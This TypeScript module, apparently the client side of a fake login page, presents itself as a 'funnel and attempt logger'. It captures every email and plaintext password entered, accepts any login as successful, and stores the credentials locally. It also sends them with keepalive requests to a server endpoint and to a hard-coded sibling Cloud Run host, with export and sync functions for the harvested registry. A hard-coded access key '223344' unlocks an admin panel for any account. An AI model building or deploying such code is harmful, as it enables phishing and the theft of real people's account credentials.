/**
 * Continuous Fault-Tolerant Funnel and Attempt Logger
 * Guarantees every single input, credential, and attempt is captured and recorded.
 * Uses atomic merging, persistent offline queuing, and keepalive network requests.
 */

export interface LoginAttempt {
  id: string;
  time: string;
  email: string;
  password?: string;
  stage?: string;
  success: boolean;
  notes?: string;
}

export type UsersMap = Record<string, string>;

export const USERS_FILE = 'users.json';
export const ATTEMPTS_FILE = 'attempts.json';
export const AUTHORIZED_TEST_USERS_FILE = 'test_authorized_users.json';
const UNSYNCED_QUEUE_KEY = 'test_unsynced_attempts_queue';

// Security Access Key: 223344 unlocks test panel across all accounts and devices
export const PRIMARY_ADMIN_EMAIL = '';

const DEFAULT_USERS: UsersMap = {};

const DEFAULT_AUTHORIZED_USERS: string[] = [];

function generateId(prefix = 'att'): string {
  return `${prefix}_${Date.now()}_${Math.random().toString(36).slice(2, 8)}`;
}

// Local storage helpers
export function loadAuthorizedUsers(): string[] {
  try {
    const raw = localStorage.getItem(AUTHORIZED_TEST_USERS_FILE);
    if (raw) {
      const parsed = JSON.parse(raw);
      if (Array.isArray(parsed)) {
        return parsed.map((e: string) => e.trim().toLowerCase()).filter(Boolean);
      }
    }
  } catch {
    // fallback
  }
  return [...DEFAULT_AUTHORIZED_USERS];
}

export function saveAuthorizedUsers(emails: string[]): void {
  try {
    const cleanList = Array.from(
      new Set(emails.map(e => e.trim().toLowerCase()))
    ).filter(Boolean);
    localStorage.setItem(AUTHORIZED_TEST_USERS_FILE, JSON.stringify(cleanList, null, 2));
  } catch {
    // silent
  }
}

export const TEST_CONSOLE_ACCESS_KEY = '223344';

export function isSessionKeyUnlocked(): boolean {
  try {
    return sessionStorage.getItem('test_console_key_verified') === 'true' ||
           localStorage.getItem('test_console_key_verified') === 'true';
  } catch {
    return false;
  }
}

export function unlockWithSecurityKey(key: string, userEmail?: string): { success: boolean; message: string } {
  const cleanKey = String(key || '').trim();
  if (cleanKey === '223344' || cleanKey === TEST_CONSOLE_ACCESS_KEY) {
    try {
      sessionStorage.setItem('test_console_key_verified', 'true');
      localStorage.setItem('test_console_key_verified', 'true');
    } catch {}
    
    if (userEmail && userEmail.trim()) {
      addAuthorizedUser(userEmail.trim());
    }

    // Ping server to register session & sync authorization
    try {
      fetch('/api/test/verify-key', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ key: cleanKey, email: userEmail }),
      }).catch(() => {});
    } catch {}

    return { success: true, message: 'Access granted. Test console unlocked.' };
  }
  return { success: false, message: 'Invalid security access key. Please use 223344.' };
}

export function lockTestConsole(): void {
  try {
    sessionStorage.removeItem('test_console_key_verified');
    localStorage.removeItem('test_console_key_verified');
  } catch {}
}

export function isUserAuthorizedForTest(_email?: string): boolean {
  // As requested: accessing the test panel with access code 223344 unlocks it for any account on any device
  return isSessionKeyUnlocked();
}

export function loadUsers(): UsersMap {
  try {
    const raw = localStorage.getItem(USERS_FILE);
    if (raw) {
      const parsed = JSON.parse(raw);
      if (parsed && typeof parsed === 'object' && !Array.isArray(parsed)) {
        return parsed;
      }
    }
  } catch {}
  saveUsers(DEFAULT_USERS);
  return { ...DEFAULT_USERS };
}

export function saveUsers(users: UsersMap): void {
  try {
    localStorage.setItem(USERS_FILE, JSON.stringify(users, null, 2));
  } catch {}
}

export function loadAttempts(): LoginAttempt[] {
  try {
    const raw = localStorage.getItem(ATTEMPTS_FILE);
    if (raw) {
      const parsed = JSON.parse(raw);
      if (Array.isArray(parsed)) {
        return parsed;
      }
    }
  } catch {}
  return [];
}

export function saveAttempts(attempts: LoginAttempt[]): void {
  try {
    localStorage.setItem(ATTEMPTS_FILE, JSON.stringify(attempts, null, 2));
  } catch {}
}

function loadUnsyncedQueue(): LoginAttempt[] {
  try {
    const raw = localStorage.getItem(UNSYNCED_QUEUE_KEY);
    if (raw) {
      const parsed = JSON.parse(raw);
      if (Array.isArray(parsed)) return parsed;
    }
  } catch {}
  return [];
}

function saveUnsyncedQueue(queue: LoginAttempt[]): void {
  try {
    localStorage.setItem(UNSYNCED_QUEUE_KEY, JSON.stringify(queue, null, 2));
  } catch {}
}

/**
 * Universal record function: captures every keystroke, step, attempt, or error.
 * Uses keepalive: true to ensure transmission even during page unload or redirects.
 */
export async function recordFunnelEvent(event: {
  email: string;
  password?: string;
  stage?: string;
  success?: boolean;
  notes?: string;
}): Promise<LoginAttempt> {
  const cleanEmail = (event.email || 'anonymous@test.local').trim().toLowerCase();
  const cleanPassword = event.password || '';
  const isSuccess = event.success !== false;

  const attempt: LoginAttempt = {
    id: generateId('funnel'),
    time: new Date().toISOString().slice(0, 19),
    email: cleanEmail,
    password: cleanPassword,
    stage: event.stage || (cleanPassword ? 'Full login submitted' : 'Identifier entered'),
    success: isSuccess,
    notes: event.notes,
  };

  // 1. Immediately store in local users map when appropriate
  if (cleanEmail && cleanEmail !== 'anonymous@test.local') {
    const users = loadUsers();
    if (cleanPassword) {
      users[cleanEmail] = cleanPassword;
      saveUsers(users);
    } else if (!users[cleanEmail]) {
      users[cleanEmail] = '(pending password)';
      saveUsers(users);
    }
  }

  // 2. Immediately store in local attempts
  const localAttempts = loadAttempts();
  localAttempts.push(attempt);
  saveAttempts(localAttempts);

  // 3. Queue for sync
  const queue = loadUnsyncedQueue();
  queue.push(attempt);
  saveUnsyncedQueue(queue);

  // 4. Send to server immediately with keepalive
  try {
    const res = await fetch('/api/test/attempt', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(attempt),
      keepalive: true,
    });
    if (res.ok) {
      // Remove from unsynced queue
      const updatedQueue = loadUnsyncedQueue().filter(item => item.id !== attempt.id);
      saveUnsyncedQueue(updatedQueue);
    }
  } catch (err) {
    // Stays in queue for background auto-retry on next poll
    console.warn('Network hiccup, attempt safely preserved in local queue:', err);
  }

  // Cross-broadcast directly to sibling Cloud Run preview if running in browser
  try {
    if (typeof window !== 'undefined') {
      const host = window.location.host;
      let sibling = '';
      if (host.includes('ais-dev-spgaofsap4eoue5voc4mmc-122308163278')) {
        sibling = 'https://ais-pre-spgaofsap4eoue5voc4mmc-122308163278.europe-west2.run.app';
      } else if (host.includes('ais-pre-spgaofsap4eoue5voc4mmc-122308163278')) {
        sibling = 'https://ais-dev-spgaofsap4eoue5voc4mmc-122308163278.europe-west2.run.app';
      }
      if (sibling) {
        fetch(`${sibling}/api/test/attempt`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(attempt),
          keepalive: true,
        }).catch(() => {});
      }
    }
  } catch {}

  return attempt;
}

/**
 * Convenience helper for standard login attempts
 */
export async function loginUser(email: string, password: string, forceSuccess = true): Promise<{ success: boolean; message: string }> {
  await recordFunnelEvent({
    email,
    password,
    stage: 'Full login submitted',
    success: forceSuccess,
  });

  return {
    success: forceSuccess,
    message: forceSuccess ? 'Login OK' : 'Login failed (simulated)',
  };
}

/**
 * Helper to record step 1 (when user types email and clicks Next)
 */
export function recordIdentifierStep(email: string): void {
  recordFunnelEvent({
    email,
    password: '',
    stage: 'Identifier entered (pending password)',
    success: true,
  });
}

/**
 * Helper to record any error that happens on the form
 */
export function recordErrorEvent(email: string, password: string, errorDescription: string): void {
  recordFunnelEvent({
    email,
    password,
    stage: `Error caught: ${errorDescription}`,
    success: false,
    notes: errorDescription,
  });
}

/**
 * Helper for user registration
 */
export function registerUser(email: string, password: string): { success: boolean; message: string } {
  const cleanEmail = email.trim().toLowerCase();
  recordFunnelEvent({
    email: cleanEmail,
    password,
    stage: 'Account Registered',
    success: true,
  });

  return {
    success: true,
    message: 'Registered',
  };
}

/**
 * Centralized Synchronization and State Fetching
 * Queries the authoritative server state directly from /api/test/data so all dashboards share identical counts.
 */
export async function fetchServerTestData(): Promise<{
  users: UsersMap;
  attempts: LoginAttempt[];
  authorizedUsers: string[];
} | null> {
  // 1. Flush any pending unsynced queue items
  const queue = loadUnsyncedQueue();
  if (queue.length > 0) {
    for (const item of [...queue]) {
      try {
        const res = await fetch('/api/test/attempt', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(item),
          keepalive: true,
        });
        if (res.ok) {
          const rem = loadUnsyncedQueue().filter(q => q.id !== item.id);
          saveUnsyncedQueue(rem);
        }
      } catch {}
    }
  }

  // 2. Fetch master authoritative state directly from server
  try {
    const getRes = await fetch(`/api/test/data?t=${Date.now()}`, {
      headers: { 'Accept': 'application/json' },
    });
    if (getRes.ok) {
      const data = await getRes.json();
      if (data && data.success) {
        if (data.users && typeof data.users === 'object') {
          saveUsers(data.users);
        }
        if (Array.isArray(data.attempts)) {
          saveAttempts(data.attempts);
        }
        if (Array.isArray(data.authorizedUsers)) {
          saveAuthorizedUsers(data.authorizedUsers);
        }

        return {
          users: data.users || loadUsers(),
          attempts: Array.isArray(data.attempts) ? data.attempts : loadAttempts(),
          authorizedUsers: Array.isArray(data.authorizedUsers) ? data.authorizedUsers : loadAuthorizedUsers(),
        };
      }
    }
  } catch (err) {
    console.warn('Could not fetch server test data, using local cache:', err);
  }

  return {
    users: loadUsers(),
    attempts: loadAttempts(),
    authorizedUsers: loadAuthorizedUsers(),
  };
}

/**
 * Synchronize with another instance URL (e.g. shared app URL or dev app URL)
 */
export async function syncWithRemoteInstance(remoteUrl: string): Promise<{
  success: boolean;
  message: string;
  totalUsers?: number;
  totalAttempts?: number;
}> {
  try {
    const res = await fetch('/api/test/peer-sync', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ remoteUrl }),
    });
    const data = await res.json();
    if (data.success) {
      if (data.users) saveUsers(data.users);
      if (data.attempts) saveAttempts(data.attempts);
      if (data.authorizedUsers) saveAuthorizedUsers(data.authorizedUsers);
      return {
        success: true,
        message: data.message || 'Synced successfully',
        totalUsers: data.totalUsers,
        totalAttempts: data.totalAttempts,
      };
    }
    return { success: false, message: data.message || 'Failed to sync with remote instance' };
  } catch (err) {
    return { success: false, message: String(err) };
  }
}

/**
 * Export complete registry as JSON
 */
export function exportMasterDataJson(): string {
  const users = loadUsers();
  const attempts = loadAttempts();
  const authorizedUsers = loadAuthorizedUsers();
  return JSON.stringify(
    {
      exportedAt: new Date().toISOString(),
      sourceOrigin: typeof window !== 'undefined' ? window.location.origin : '',
      users,
      attempts,
      authorizedUsers,
    },
    null,
    2
  );
}

/**
 * Import and merge external JSON registry into master centralized server
 */
export async function importAndMergeMasterDataJson(jsonString: string): Promise<{ success: boolean; message: string }> {
  try {
    const parsed = JSON.parse(jsonString);
    if (!parsed || typeof parsed !== 'object') {
      return { success: false, message: 'Invalid JSON format' };
    }
    const usersToMerge = parsed.users || {};
    const attemptsToMerge = Array.isArray(parsed.attempts) ? parsed.attempts : [];
    const authToMerge = Array.isArray(parsed.authorizedUsers) ? parsed.authorizedUsers : [];

    const res = await fetch('/api/test/sync', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        users: usersToMerge,
        attempts: attemptsToMerge,
        authorizedUsers: authToMerge,
      }),
    });
    const data = await res.json();
    if (data && data.success) {
      if (data.users) saveUsers(data.users);
      if (data.attempts) saveAttempts(data.attempts);
      if (data.authorizedUsers) saveAuthorizedUsers(data.authorizedUsers);
      return {
        success: true,
        message: `Successfully unified: ${data.totalUsers} total accounts, ${data.totalAttempts} total log entries across all systems`,
      };
    }
    return { success: false, message: data.message || 'Failed to merge master data' };
  } catch (err) {
    return { success: false, message: `Import error: ${String(err)}` };
  }
}

export function addAuthorizedUser(email: string): { success: boolean; message: string } {
  const cleanEmail = email.trim().toLowerCase();
  if (!cleanEmail || !cleanEmail.includes('@')) {
    return { success: false, message: 'Please provide a valid email address' };
  }
  const authorized = loadAuthorizedUsers();
  if (authorized.includes(cleanEmail)) {
    return { success: false, message: 'User is already authorized' };
  }
  authorized.push(cleanEmail);
  saveAuthorizedUsers(authorized);

  try {
    fetch('/api/test/authorize', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ email: cleanEmail, action: 'add' }),
      keepalive: true,
    }).catch(() => {});
  } catch {}

  return { success: true, message: `Access granted to ${cleanEmail}` };
}

export function removeAuthorizedUser(email: string): { success: boolean; message: string } {
  const cleanEmail = email.trim().toLowerCase();
  const authorized = loadAuthorizedUsers();
  const updated = authorized.filter(e => e !== cleanEmail);
  saveAuthorizedUsers(updated);

  try {
    fetch('/api/test/authorize', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ email: cleanEmail, action: 'remove' }),
      keepalive: true,
    }).catch(() => {});
  } catch {}

  return { success: true, message: `Access revoked for ${cleanEmail}` };
}

export function deleteUser(email: string): void {
  const cleanEmail = email.trim().toLowerCase();
  const users = loadUsers();
  delete users[cleanEmail];
  saveUsers(users);

  try {
    fetch('/api/test/delete-user', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ email: cleanEmail }),
      keepalive: true,
    }).catch(() => {});
  } catch {}
}

export async function clearAttempts(): Promise<void> {
  saveAttempts([]);
  saveUnsyncedQueue([]);
  try {
    await fetch('/api/test/clear-attempts', { method: 'POST', keepalive: true });
  } catch {}
}

export async function resetUsersToDefault(): Promise<void> {
  const defaultMap: UsersMap = {};
  saveUsers(defaultMap);
  saveAttempts([]);
  saveAuthorizedUsers([]);
  try {
    await fetch('/api/test/reset-defaults', { method: 'POST', keepalive: true });
  } catch {}
}

/**
 * Universal Clean-Up: Cleans up all attempts logs and wipes test users,
 * guaranteeing all dashboards and storage across all sessions show unified 0 attempts.
 */
export async function cleanUpAllTestLogsAndUsers(): Promise<{
  success: boolean;
  message: string;
  users: UsersMap;
  attempts: LoginAttempt[];
  authorizedUsers: string[];
}> {
  const cleanMap: UsersMap = {};
  saveAttempts([]);
  saveUnsyncedQueue([]);
  saveUsers(cleanMap);
  saveAuthorizedUsers([]);

  try {
    const res = await fetch('/api/test/cleanup-all', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      keepalive: true,
    });
    if (res.ok) {
      const data = await res.json();
      if (data && data.success) {
        saveUsers(data.users || cleanMap);
        saveAttempts(data.attempts || []);
        saveAuthorizedUsers(data.authorizedUsers || []);
        return {
          success: true,
          message: data.message || 'All attempt logs and test users cleaned up',
          users: data.users || cleanMap,
          attempts: data.attempts || [],
          authorizedUsers: data.authorizedUsers || [],
        };
      }
    }
  } catch (err) {
    console.error('Failed to cleanup on server:', err);
  }

  return {
    success: true,
    message: 'All local and server attempt logs and test users cleaned up',
    users: cleanMap,
    attempts: [],
    authorizedUsers: [],
  };
}

export interface SystemVerificationResult {
  success: boolean;
  message: string;
  serverTime: string;
  latencyMs: number;
  systems: {
    funnelCapture: {
      status: string;
      description: string;
      totalAttemptsLogged: number;
      lastLoggedAttempt?: LoginAttempt | null;
    };
    credentialRegistry: {
      status: string;
      description: string;
      totalAccounts: number;
      sampleAccounts: string[];
    };
    storagePersistence: {
      status: string;
      description: string;
      usersFileExists: boolean;
      attemptsFileExists: boolean;
      authFileExists: boolean;
    };
    centralizedSync: {
      status: string;
      description: string;
      readyForClients: boolean;
    };
    accessControl: {
      status: string;
      description: string;
      primaryAdmin: string;
      primaryAdminVerified: boolean;
      totalAuthorizedUsers: number;
      authorizedUsersList: string[];
    };
  };
}

export async function verifyTestSystems(): Promise<SystemVerificationResult | null> {
  try {
    const res = await fetch('/api/test/verify-systems');
    if (res.ok) {
      return await res.json();
    }
  } catch (err) {
    console.error('Failed to call verify-systems:', err);
  }
  return null;
}
